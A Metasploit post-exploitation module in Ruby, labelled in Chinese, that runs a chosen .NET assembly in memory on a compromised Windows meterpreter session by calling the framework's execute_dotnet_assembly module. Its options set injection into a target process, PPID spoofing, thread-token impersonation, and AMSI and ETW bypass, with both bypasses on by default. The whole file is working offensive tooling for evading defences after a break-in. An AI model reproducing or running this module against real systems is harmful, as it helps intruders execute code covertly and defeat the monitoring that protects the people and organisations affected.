# -*- coding: UTF-8 -*-

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '测试调用.net程序',
        'Description' => %q{
          本模块调用execute_dotnet_assembly模块在内存中执行.net程序
        },
        'License' => MSF_LICENSE,
        'Author' => ['3ricK5r'],
        'Arch' => [ARCH_X64],
        'Platform' => 'win',
        'SessionTypes' => ['meterpreter'],
        'Targets' => [['Windows x64 (<= 10)', { 'Arch' => ARCH_X64 }]],
        'DefaultTarget' => 0
      )
  )
    register_options(
      [
        OptPath.new('DOTNET_EXE', [true, '.net程序路径']),
        OptString.new('ARGUMENTS', [false, '命令行参数（必须为字符串）']),
        OptString.new('PROCESS', [false, '准备启动的进程名称', 'notepad.exe']),
        OptString.new('USETHREADTOKEN', [false, '使用线程模拟生成进程', true]),
        OptInt.new('PID', [false, '注入到的Pid', 0]),
        OptInt.new('PPID', [false, '创建新进程时用于 PPID spoofing 的进程标识符。 (0 = no PPID spoofing)', 0]),
        OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
        OptBool.new('ETWBYPASS', [true, 'Enable Etw bypass', true]),
        OptInt.new('WAIT', [false, '进程运行后等待其执行的时间（单位：秒）', 10]),
        OptInt.new('TIMEOUT', [false, '等待返回结果的超时时间（单位：秒）', 600])
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('KILL', [true, '任务结束之后关闭进程', false])
      ]
    )
  end

  def run
    execute_dotnet_assembly = framework.modules.create('post/windows/manage/execute_dotnet_assembly')

    result = execute_dotnet_assembly.run_simple(
      'LocalInput'  => user_input,
      'LocalOutput' => user_output,
      'Options'     => datastore
    )
  end
end
